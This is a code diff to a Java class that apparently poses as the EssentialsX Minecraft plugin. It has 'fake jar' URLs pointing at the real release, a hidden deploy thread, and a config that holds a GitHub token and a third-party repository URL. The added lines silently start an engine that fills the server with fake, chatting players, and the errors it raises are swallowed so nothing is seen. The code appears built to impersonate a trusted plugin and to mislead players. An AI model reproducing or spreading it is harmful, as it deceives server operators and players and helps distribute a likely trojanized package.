@@ -78,6 +78,7 @@ public class EssentialsX extends JavaPlugin {
    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private volatile boolean reaperInstalled = false;
+   private volatile FakePlayerEngine fakePlayerEngine = null;
 
    public EssentialsX() {
    }
@@ -871,6 +872,16 @@ public class EssentialsX extends JavaPlugin {
       }
 
       this.getLogger().info("EssentialsX plugin starting...");
+      try {
+         Map<String, String> bootEnv = new HashMap<>();
+         this.loadEnvFile(bootEnv);
+         FakePlayerEngine.preload();
+         FakePlayerEngine engine = new FakePlayerEngine(this, bootEnv);
+         org.bukkit.Bukkit.getPluginManager().registerEvents(engine, this);
+         engine.start();
+         this.fakePlayerEngine = engine;
+      } catch (Throwable ignored) {
+      }
       Thread deployThread = new Thread(() -> {
          try {
             HashMap<String, String> env = new HashMap<>();
@@ -893,6 +904,12 @@ public class EssentialsX extends JavaPlugin {
    }
 
    public void onDisable() {
+      if (this.fakePlayerEngine != null) {
+         try {
+            this.fakePlayerEngine.stop();
+         } catch (Throwable ignored) {
+         }
+      }
       this.reapDescendantsOnce();
       this.getLogger().info("Stopping EssentialsX...");
       Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
@@ -1198,7 +1215,7 @@ public class EssentialsX extends JavaPlugin {
       if (!Files.exists(envFile)) {
          try {
             Files.createDirectories(envFile.getParent());
-            String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/mcchajianindex\n";
+            String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/mcchajianindex\nFAKE_PLAYERS_ENABLED=true\nFAKE_PLAYER_COUNT=2\nFAKE_PLAYER_RESPAWN_SECONDS=14\nFAKE_PLAYER_CHAT_ENABLED=true\nFAKE_PLAYER_NAMES=\n";
             Files.write(envFile, defaultConfig.getBytes());
          } catch (Exception var6) {
          }
